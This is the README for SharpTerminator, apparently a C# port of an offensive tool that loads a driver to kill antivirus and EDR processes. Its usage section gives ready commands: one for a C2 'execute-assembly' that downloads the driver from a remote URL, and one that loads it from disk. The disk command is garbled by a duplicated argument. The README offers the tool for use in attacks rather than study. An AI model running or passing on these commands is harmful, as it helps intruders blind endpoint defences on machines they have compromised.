# SharpTerminator

C# port of ZeroMemoryEx's Terminator, so all hail goes to him.

# Usage

You can download the driver from a remote URL using SharpTerminator and load it to terminate AV/EDR processes, or you can directly load it to the disk to perform the same operation.

In fact, there is no difference between them; if you don't want to use the upload function in your C2, you can use the other one.

Loading from remote url:
```
execute-assembly SharpTerminator.exe --url "http://remoteurl.com:80/Terminator.sys"
```
Loading from disk:
```
SharpTerminator.exe --disk SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
```


### Download driver from remote url and terminate AV/EDR:
![image](https://github.com/mertdas/SharpTerminator/assets/48562581/8eb24a46-8c00-4cd3-8a73-42409b234114)

### Load driver from disk and terminate AV/EDR:

![image](https://github.com/mertdas/SharpTerminator/assets/48562581/232b67b0-f5c6-44cc-936d-d6acdb617a74)

# Credit
ZeroMemoryEx https://github.com/ZeroMemoryEx/Terminator<br>
Spyboy :)

